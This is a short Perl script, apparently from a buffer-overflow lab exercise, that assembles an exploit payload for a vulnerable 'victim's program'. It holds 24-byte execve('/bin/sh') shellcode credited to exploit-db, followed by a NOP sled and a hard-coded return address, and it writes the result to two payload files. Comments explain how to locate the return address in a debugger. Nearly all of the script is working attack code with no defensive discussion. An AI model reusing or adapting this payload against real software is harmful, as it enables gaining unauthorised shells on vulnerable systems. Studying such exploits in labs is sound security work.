#!/usr/bin/perl

####
#  execve(/bin/sh).
#  24 bytes.
# www.exploit-db.com/exploits/13444
####


# shellcode for spawning a new shell in victim's machine
#

# NOTE: "." is a perl way to cat two strings (NOT part of shellcode)
#

my $shellcode =
"\x31\xc0".			# xorl		%eax, %eax
"\x50".				# pushl	%eax
"\x68\x6e\x2f\x73\x68".		# pushl        $0x68732f6e
"\x68\x2f\x2f\x62\x69".		# pushl	$0x69622f2f
"\x89\xe3" .			# movl         %esp, %ebx
"\x99".				# cltd
"\x52".				# pushl        %edx
"\x53".				# pushl        %ebx
"\x89\xe1".		        # movl         %esp, %ecx
"\xb0\x0b" .                    # movb         $0xb, %al
"\xcd\x80"                      # int          $0x80
;

# This address must match the buffer variable of the victim's program */
#my $retaddr = "\x90\x90\x55\x57";  #0xbffff218 0x57 55 90 90 0xfffebde8

#start the program running, break on the call, examin 32 bytes, look for the very next byte, thats where to drop it
my $retaddr = "\x70\x85\x04\x08";  #0x 08 04 85 70

# Fill NOP instruction
my $pad = "\x90" x 40;

# Input string to our victim's program
my $arg = $shellcode.$pad.$retaddr;

# Let us store the input string to a file
open OUT, "> payloadfunc1";
print OUT $arg;
close OUT;
#need to split this up, or write two perl scripts to output these two...
open OUT, "> payloadfunc2";
print OUT $arg;
close OUT;
